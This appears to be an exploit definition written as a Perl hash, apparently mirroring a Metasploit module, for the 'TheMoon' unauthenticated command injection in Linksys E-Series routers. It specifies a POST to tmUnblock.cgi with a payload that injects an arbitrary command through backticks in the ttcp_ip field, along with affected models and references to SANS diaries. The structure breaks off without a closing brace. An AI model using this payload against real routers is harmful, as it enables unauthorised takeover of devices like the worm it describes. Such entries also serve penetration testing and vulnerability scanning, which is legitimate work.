my $EXPLOIT = {
  DESCRIPTION => "

        Some Linksys E-Series Routers are vulnerable to an unauthenticated OS command

        injection. This vulnerability was used from the so-called \"TheMoon\" worm. There

        are many Linksys systems that are potentially vulnerable, including E4200, E3200, E3000,

        E2500, E2100L, E2000, E1550, E1500, E1200, E1000, and E900. This module was tested

        successfully against an E1500 v1.0.5.

      ",
  METHOD      => "POST",
  MSF_MODULE  => "linksys_themoon_exec",
  OSVDB       => 103321,
  PATH        => "tmUnblock.cgi?",
  PATHS       => ["tmUnblock.cgi"],
  PAYLOAD     => "submit_button=&change_action=&action=&commit=0&ttcp_num=2&ttcp_size=2&ttcp_ip=-h`__CMD__`&StartEPI=1&",
  REFERENCES  => [
                   "https://isc.sans.edu/diary/Linksys+Worm+%22TheMoon%22+Summary%3A+What+we+know+so+far/17633",
                   "https://isc.sans.edu/forums/diary/Linksys+Worm+TheMoon+Captured/17630",
                 ],
  TITLE       => "Linksys E-Series TheMoon Remote Command Injection",
  VARIABLES => {
    'PEER' =>       { DESCRIPTION => "", VALUE => "" },
    'CMD' =>       { DESCRIPTION => "", VALUE => "" },
  },
